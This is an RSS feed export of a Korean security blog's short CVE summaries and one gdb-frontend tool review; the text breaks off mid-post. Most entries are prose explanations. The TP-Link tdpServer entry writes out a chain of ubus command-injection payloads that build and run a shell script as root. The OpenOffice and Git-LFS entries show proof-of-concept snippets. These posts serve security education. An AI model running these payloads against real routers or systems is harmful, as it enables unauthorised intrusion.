      <title>[하루한줄] Persistent arbitrary code execution in Android&#39;s Google Play Core Library</title>
      <link>https://hackyboiz.github.io/2020/11/13/l0ch/2020-11-13/</link>
      <guid>https://hackyboiz.github.io/2020/11/13/l0ch/2020-11-13/</guid>
      <pubDate>Fri, 13 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/971386&quot;&gt;CVE-2020-8913 - Per</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/971386">CVE-2020-8913 - Persistent arbitrary code execution in Android’s Google Play Core Library</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android Play Core ≤ 1.7.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google API를 통해 사용자가 Play Store에 접근하지 않고 인앱 업데이트를 할 수 있게 해주는 Play Core Library에서 임의 코드 실행이 가능한 취약점이 발견되었습니다. 이 취약점을 악용하면 Play Core Library를 사용하는 모든 안드로이드 앱을 대상으로 임의 코드 실행을 할 수 있습니다.</p><p>취약점이 존재하는 부분은 <code>SplitCompat.install</code> 로, 동일한 기기에 설치된 타사 앱이 임의의 데이터를 broadcast 할 수 있습니다. 이 과정에서 <code>split_id</code> 에 대한 유효성 검사가 없어 path traversal를 통해 원하는 위치에 임의의 파일을 복사할 수 있습니다. 이때 임의 코드를 포함하고 파일명이  <code>config.</code> 로 시작하는 파일을  <code>verified-splits</code> 경로에 복사하면  파일이 앱의 런타임 ClassLoader에 추가되어 해당 앱에서 임의 코드가 실행됩니다. </p><p>공격자는 Play Core Library를 사용하는 앱을 타겟으로 하는 악성 APK를 제작하고, 피해자가 이를 설치하도록 유도해 피해자의 데이터를 탈취하거나 코드 실행이 가능합니다.</p><p>이 취약점은 Google Chrome을 비롯한 인기 앱에서 임의 코드 실행이 가능하다는 점에서 심각한 취약점으로 분류되었습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-code-execution/">arbitrary code execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/play-core-library/">play core library</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/13/l0ch/2020-11-13/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-13958: Apache OpenOffice RCE</title>
      <link>https://hackyboiz.github.io/2020/11/12/idioth/2020-11-12/</link>
      <guid>https://hackyboiz.github.io/2020/11/12/idioth/2020-11-12/</guid>
      <pubDate>Thu, 12 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/irsl/apache-openoffice-rce-via-uno-lin</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links">Apache OpenOffice RCE (CVE-2020-13958)</a></p><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links/blob/master/job-offer-CONFIDENTIAL.odt">PoC File</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache OpenOffice 4.0.0 ~ 4.1.7</li><li>Maybe OpenOffice.org versions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache OpenOffice 4에서 원격 코드 실행 취약점이 발견되었습니다. 해당 취약점은 LibreOffice에서 발견된 CVE-2019-9847과 유사합니다.</p><p>해당 프로그램에서 <code>script:event-listener</code> 핸들러를 매크로 실행으로 처리하지 않아서 발생한 취약점입니다.</p><p>다음과 같은 스크립트로 구성하여 OpenOffice에서 사용하는 <code>.uno 혹은 .service</code>를 통해 확인창이나 클릭 유도 없이 하이퍼 링크를 통해 URL을 열 수 있습니다.</p><pre><code class="hljs vim">&lt;office:scripts&gt;   &lt;office:event-listeners&gt;    &lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span>xlink:href=<span class="hljs-string">&quot;.uno:OpenHyperlinkOnCursor&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:load&quot;</span>/&gt;   &lt;/office:event-listeners&gt;&lt;/office:scripts&gt;</code></pre><p><code>.uno .service</code>를 사용하여 트리거하는 것은 리눅스에서도 동작하지만 code execution으로 이어질만한 것을 찾지 못했다고 합니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/">https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9847">https://nvd.nist.gov/vuln/detail/CVE-2019-9847</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/openoffice/">openoffice</category>
      
      <category domain="https://hackyboiz.github.io/tags/libreoffice/">libreoffice</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-code-execution/">arbitrary code execution</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/12/idioth/2020-11-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Two CVEs on TCL Android TVs</title>
      <link>https://hackyboiz.github.io/2020/11/11/fabu1ous/2020-11-11/</link>
      <guid>https://hackyboiz.github.io/2020/11/11/fabu1ous/2020-11-11/</guid>
      <pubDate>Wed, 11 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://sick.codes/extraordinary-vulnerabilities-discover</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/">Extraordinary Vulnerabilities Discovered in TCL Android TVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>TCL android TV </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TCL android TV에 대한 CVE번호가 2개 발급됐습니다. TCL은 중국 전자제품 회사로 현재 TV 시장에서 3번째로 큰 비중을 차지하고 있습니다. 취약점을 제보한 Sick Codes와 John Jackson은 제조사의 의도가 의심스럽다는 말을 조심스럽게 하고 있습니다. </p><ul><li>CVE-2020-27403 : TV의 7989번 포트에 웹서버가 동작하고 있으며,  단순히 이곳에 접속하는 것 만으로 모든 file system에 접근이 가능합니다.</li><li>CVE-2020-28055 : 악성 apk 등의 local unprivileged attacker가 critical 한 시스템 리소스에 읽기 및 쓰기가 가능합니다.</li></ul><p>7989번 포트는 unassigned port입니다. 즉, 특정한 목적이 부여된 번호가 아니기 때문에 7989번 포트에 http로 file system을 내보낼 이유가 없습니다. 또한 제조사가 TV에 대한 완벽한 원격 제어가  가능합니다.</p><blockquote><p>Please make your own conclusions from our research.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://sick.codes/sick-2020-009">https://sick.codes/sick-2020-009</a></p><p><a href="https://sick.codes/sick-2020-012">https://sick.codes/sick-2020-012</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/android-tv/">android tv</category>
      
      <category domain="https://hackyboiz.github.io/tags/tcl/">tcl</category>
      
      <category domain="https://hackyboiz.github.io/tags/tv/">tv</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/11/fabu1ous/2020-11-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-16125: Local Privilege Escalation (LPE) in Ubuntu gdm3</title>
      <link>https://hackyboiz.github.io/2020/11/10/l0ch/2020-11-10/</link>
      <guid>https://hackyboiz.github.io/2020/11/10/l0ch/2020-11-10/</guid>
      <pubDate>Tue, 10 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2020-202-g</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-202-gdm3-LPE-unresponsive-accounts-daemon">Local Privilege Escalation (LPE) in Ubuntu gdm3 - CVE-2020-16125</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>gdm version ≤ 3.36.3-0ubuntu0.20.04.1</p><p>accountsservice version ≤ 0.6.55-0ubuntu12 ~ 20.04.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>gdm3에서 시스템 권한의 계정을 만들어 권한 상승이 가능한 취약점이 발견되었습니다.</p><p>gdm3(gnome display manager)은 그래픽 인터페이스로 로그인 및 사용자 인증을 처리하는데, 새로 설치된 시스템 등의 이유로 사용자 계정을 찾을 수 없을 때 <code>gnome-initial-setup</code> 을 호출하고 sudo 그룹의 새로운 계정을 만들 수 있습니다.</p><p>gdm3에서는 기존 계정을 찾기 위해 D-Bus 메소드 호출을 사용해 <code>accountsservice</code> 데몬의 <code>look_for_existing_users_sync</code> 에서 기존 사용자 목록을 가져옵니다. 이때 서비스 거부 공격으로 <code>accountsservice</code> 데몬이 응답하지 않도록 하면 D-Bus 메소드 호출이 시간 초과로 인해 연결이 실패하고 <code>priv→have_existing_user_accounts</code> 의 기본값인 false가 유지됩니다.</p><p>이후<code>wants_initial_setup</code> 에서 <code>priv→have_existing_user_accounts</code>가 false면 gdm3는 현재 시스템에 계정이 없는 것으로 인식하고 <code>gnome-initial-setup</code>을 호출해 시스템 권한의 계정을 생성할 수 있습니다.</p><p>해당 취약점의 패치는 <code>priv-&gt;have_existing_user_accounts</code>의 기본값을 true로 수정하는 것으로 적용되었습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/ubuntu/">ubuntu</category>
      
      <category domain="https://hackyboiz.github.io/tags/gdm3/">gdm3</category>
      
      <category domain="https://hackyboiz.github.io/tags/accountsservice/">accountsservice</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/10/l0ch/2020-11-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-10882 Bypass</title>
      <link>https://hackyboiz.github.io/2020/11/09/idioth/2020-11-09/</link>
      <guid>https://hackyboiz.github.io/2020/11/09/idioth/2020-11-09/</guid>
      <pubDate>Mon, 09 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/rdomanski/Exploits_and_Advisories/blob</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md">Pwn2Own Tokyo2020</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tdpServer daemon(<em>/usr/bin/tdpServer</em>) running on TP-Link Archer A7 and C7(AC1750), hardware version 5, MIPS Arch, firmware ver.200721 and 200628</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 라우터의 LAN에 있는 공격자만 악용할 수 있지만 특별한 인증이 필요하지 않은 취약점입니다.</p><p>CVE-200-10882에서 <code>system(systemCmd)</code>에 의해 Command Injection 취약점이 존재하였습니다. 해당 취약점은 <code>system()</code> 사용 대신 lua 스크립트를 이용하여 <code>lua_onemesh_call(slave_mac)</code>을 통해 명령어를 실행함으로써 패치되었습니다. <code>lua_onemesh_call()</code>은 <code>luci.controller.admin.onemesh</code> lua 스크립트를 사용하며 인수를 전달하고 요청된 함수의 핸들러를 실행하는  <code>dispatch</code>라는 이름의 특별한 함수를 사용합니다. 이때 <code>sync_wifi_specified(slave_mac)</code>이 실행됩니다. <code>sync_wifi_specified()</code>는 매개 변수를 <code>target_id</code>로 <code>printf</code>를 사용하여 구성되며 json 내용으로 실제 명령이 실행됩니다. json을 escape 하면 root로 실행되는 lua script process에서 명령 실행이 가능합니다.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;, &quot;timeout&quot;:5, &quot;target_id&quot;:&quot;&lt;Controlled_Parameter&gt;&quot;&#125;&#x27; &amp;</code></pre><p>slave_mac의 경우 <code>strncpy(slave_mac, *(char **)(iVar6 + 0x10), 0x11)</code>로 복사되며 <code>memset(slave_mac, 0, 0x424)</code>로 memset 됩니다. 또한 바이트 정렬로 인하여 slave_mac 변수는 0x12만큼 할당되며 17자까지 문자를 삽입할 수 있습니다.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;;&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;.&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;/&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;q&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`sh b`&#x27;&quot;&#125;&#x27; &amp;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/command-injection/">command injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/tp-link/">tp-link</category>
      
      <category domain="https://hackyboiz.github.io/tags/lua/">lua</category>
      
      <category domain="https://hackyboiz.github.io/tags/tdpserver/">tdpserver</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/09/idioth/2020-11-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Detecting Dynamic Loading in Android App</title>
      <link>https://hackyboiz.github.io/2020/11/08/fabu1ous/2020-11-08/</link>
      <guid>https://hackyboiz.github.io/2020/11/08/fabu1ous/2020-11-08/</guid>
      <pubDate>Sun, 08 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://sayfer.io/blog/dynamic-loading-in-android-applica</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sayfer.io/blog/dynamic-loading-in-android-applications-with-proc-maps/">Detecting Dynamic Loading in Android Applications With /proc/maps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android 10 API 29 이상 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android application은 dynamic loading을 통해 run-time 도중 어느 시점에라도 코드를 메모리에 로드할 수 있습니다. API level 29부턴 이 dynamic loading을 악용해 apk의 정적 검사를 피해 가는 악성코드들을 막기 위해 apk에 속하지 않은 코드의 load를 막고 있습니다. 하지만 여전히 DexClassLoader에 의한 .dex 파일의 dynamic loading이 가능해 여전히 악용에 사용될 수 있습니다.</p><p>모든 프로세스는 각각 <code>/proc/[PID]</code>라는 디렉터리를 갖고, 그중 <code>/proc/[PID]/maps</code>라는 파일은 프로세스의 매핑된 메모리가 기록돼있습니다.  따라서 프로세스가 어떠한 파일에 접근하면 <code>/proc/[PID]/maps</code>에 기록이 남습니다. 이 기록을 통해 프로세스가 <code>/data/data</code> 디렉터리 속 .dex 접근 여부를 검사해 dynamic loading을 탐지할 수 있습니다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">https://developer.android.com/reference/dalvik/system/DexClassLoader</a></p><p><a href="https://developer.android.com/about/versions/10/behavior-changes-10">https://developer.android.com/about/versions/10/behavior-changes-10</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
      
      <category domain="https://hackyboiz.github.io/tags/dynamic-loading/">dynamic loading</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/08/fabu1ous/2020-11-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] gdb-frontend 포너블에 적합한가?</title>
      <link>https://hackyboiz.github.io/2020/11/08/fabu1ous/gdb-frontend-review/</link>
      <guid>https://hackyboiz.github.io/2020/11/08/fabu1ous/gdb-frontend-review/</guid>
      <pubDate>Sun, 08 Nov 2020 06:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;5개월-묵힌-링크&quot;&gt;&lt;a href=&quot;#5개월-묵힌-링크&quot; class=&quot;headerlink&quot; title=&quot;5개월 묵힌 링크&quot;&gt;&lt;/a&gt;5개월 묵힌 링크&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/11/08/fabu1ous/gdb-fronten</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="5개월-묵힌-링크"><a href="#5개월-묵힌-링크" class="headerlink" title="5개월 묵힌 링크"></a>5개월 묵힌 링크</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/1.png"></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/2.png"></p><p>몇 달 전 Fandu형님이 직접 사용해보고 후기를 알려달라는 말과 함께 링크를 하나 던져주셨습니다. 할 일도 묵혀둬야 제맛! 5달 동안 고이 모셔놓은 GDBFrontend, 똥인지 된장인지 찍어 먹어 봅시다.</p><h1 id="설치-및-실행"><a href="#설치-및-실행" class="headerlink" title="설치 및 실행"></a>설치 및 실행</h1><p><a href="https://github.com/rohanrhu/gdb-frontend">rohanrhu/gdb-frontend</a></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/rohanrhu/gdb-frontend.git&gt; gdb-frontend<span class="hljs-built_in">cd</span> gdb-frontend./gdbfrontend</code></pre><p>공식 github에 나와 있는 설치 방법입니다. 터미널 키시고 그대로 입력하시면 되겠습니다.</p><ol><li>GDB 8.2 이상</li><li>python3</li><li>tmux</li></ol><p>gdb-frontend를 사용하기 위한 요구사항은 3가지가 있는데, 지금 저의 환경은 Ubuntu 20.04이므로 tmux만 추가로 설치해주면 환경 세팅은 끝입니다.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/3.png"></p><p>gdb-frontend를 실행시킨 후 브라우저로 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>에  접속해주시면 됩니다. <code>-w</code> 옵션으로 working directory도 설정해 줄 수 있습니다.</p><h1 id="파이어-폭스는-나가있어"><a href="#파이어-폭스는-나가있어" class="headerlink" title="파이어 폭스는 나가있어"></a>파이어 폭스는 나가있어</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/4.png"></p><p>만약 파이어폭스를 쓰고 계신다면 다른 브라우저를 사용하셔야 합니다. gdb-frontend server와의 연결이 계속 끊기길래 원인을 찾느라 시간 낭비를 좀 많이 했습니다. 자주 애용하는 gdb 플러그인 pwndbg와의 충돌이 문제라 생각해 pwndbg도 지워보고, 아예 VM을 새로 생성해 처음부터 다시 환경 구축해봤지만 결국 파폭과의 호환 문제였네요…</p><p><a href="https://github.com/rohanrhu/gdb-frontend/issues/5">tmux.conf invalid settings problem · Issue #5 · rohanrhu/gdb-frontend</a></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/5.png"></p><h1 id="gui-훑어보기"><a href="#gui-훑어보기" class="headerlink" title="gui 훑어보기"></a>gui 훑어보기</h1><pre><code class="hljs bash">$ ./gdbfrontend -w /home/fabu1ous/Desktop/GDBFrontend v0.3.0-gitListening on 127.0.0.1: &lt;http://127.0.0.1:5551/&gt;Open this address <span class="hljs-keyword">in</span> web browser: &lt;http://127.0.0.1:5551/terminal/&gt;</code></pre><p>브라우저로 접속한 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>의 화면은 gdb shell이 띄워진 terminal과 gui 부분으로 나뉩니다. terminal 부분은 gdb와 다를 게 없으니 넘어가고, gui의 기본적인 구성과 기능 중 제가 써보면서 좋다고 느낀 점들을 써보겠습니다.</p><p>[ ! ] 개발자의 관점에서 디버거를 써본 적이 단 한 번도 없으니 유의하세요.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/6.png"></p><p>함수 별로 assembly 코드로 출력해주며 다음에 실행될 인스트럭션은 연한 색으로 하이라이트 됩니다. 그중에서도 Call Stack 0번에 나타나는 함수의 하이라이트 된 부분은 eip (혹은 rip)입니다. 현재 프로그램 흐름의 위치를 대단히 직관적으로 알 수 있습니다. 글재주가 없어서 이렇게밖에 설명을 못 하겠네요. ㅎㅎ</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/7.png"></p><p>break point는 instruction의 주소를 클릭해서 생성 혹은 삭제할 수 있습니다. 좌측에 break point들의 목록을 보여주며 체크박스로 활성화 여부를 변경할 수 있습니다. 기존에 사용하던 pwndbg에서 가장 아쉬웠던 점이 바로 break point 관리가 번거롭다는 것인데, gdb-frontend는 GUI로 이 기능을 제공하니 상대적으로 좀 더 편리합니다.</p><h1 id="쓸-가치가-있는가"><a href="#쓸-가치가-있는가" class="headerlink" title="쓸 가치가 있는가?"></a>쓸 가치가 있는가?</h1><p>확장성이 좋다는 점을 내세우고 있는 만큼 설명할게 많진 않네요.</p><p>위에서 설명한 것들을 제외하면 대부분의 기능을 gdb에 의존하고 있고, 그냥 gdb만 사용하는 것과 크게 다르다는 느낌은 받지 못했습니다. gdb를 써보신 분들은 아시겠지만 gdb만을 사용해서 디버깅하는 변태는 없습니다. 적어도 해킹 씬에는 없을 거야. 메모리나 register값의 변화에 집중하며 디버깅하는 저에게 instruction 하나 실행할 때마다 <code>info reg</code> 같은 명령어를 입력하라고 한다면… 어후…</p><p>그런 점을 gdb-frontend가 개선해주진 않습니다. UI가 이쁘긴 하지만 저에게 필요한 부분은 구현이 안돼 있으니 ‘이쁜 쓰레기’라는 단어는 이럴 때 쓰는 말 이겠죠. 정작 Disassembly는 화면에 두 번이나 출력해줍니다. ㅎㅎ</p><blockquote><p>L0ch 曰 : 이쁜 쓰레기네 이쁜 쓰레기</p></blockquote><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/8.png"></p><p>gdb-frontend로 CTF문제 하나 풀고, 연구 글을 가장한 write-up을 작성하려 했지만 도저히 gdb-frontend만으로 문제를 풀 순 없을 거 같네요. 그래서 일말의 희망을 갖고 pwndbg와 연동해봤습니다만, gdb-frontend는 주객전도를 허용하지 않습니다. gdb-frontend의 ui가 없어질 정도로 terminal의 크기를 키워야 하고,</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/9.png"></p><p>무엇보다 gdb-frontend가 뻗어버립니다. 일단 제가 사용하면서 crash 나는 상황은 2가지 있었습니다.</p><ol><li>분석하고 있는 프로세스가 segmentation fault를 일으킬 때</li><li>존재하는 프로세스에 attach 할 때</li></ol><p>저에겐 이 두 가지 상황 모두 매우 큰 단점입니다. python exploit 코드에 따라 동작하고 있는 프로세스에 gdb를 attach 해 분석하는 것이 주된 사용방법인데, 그게 안된다니요… 그리고 segmentation fault에 대한 어떠한 정보도 얻을 수 없으니 취약점 찾는 입장에선 화딱지가 안 날 수가 없습니다.</p><h1 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h1><ol><li>gdb의 기능을 gui로 사용할 수 있다? <strong>No</strong><ul><li>결국 모든 동작은 gdb terminal을 통해 이루어짐.</li><li>gui로 gdb를 다루는 것이 아니라, gdb의 결괏값을 gui로 보여주는 플러그인</li><li>chrome으로 gdb를 사용하는 거라 오히려 불편함</li></ul></li><li>pwnable에 사용할 수 있다? <strong>No</strong></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/gdb-frontend/">gdb-frontend</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndbg/">pwndbg</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/08/fabu1ous/gdb-frontend-review/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-27955: Git-LFS RCE Exploit</title>
      <link>https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/</link>
      <guid>https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/</guid>
      <pubDate>Fri, 06 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-20</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>대용량 파일을 업로드 하기 위해 github에서 개발한 extension인 git-lfs(Large File Storage)에서 Windows를 대상으로 원격 코드 실행이 가능한 취약점이 발견되었습니다.</p><p>해당 취약점을 악용하여 git-lfs로 업로드한 파일이 있는 저장소에서 Windows 시스템의 피해자가 저장소를 복제할 때 상호작용 없이 공격자의 악성 바이너리가 실행될 수 있습니다.</p><p>취약점의 PoC는 아래와 같습니다.</p><ol><li><p>공격자는 저장소에 실행할 명령어를 포함한 <code>git.*</code> 이름의 windows 바이너리 형식 파일을 추가합니다.</p><pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!git add git.bat</code></pre></li><li><p>저장소에 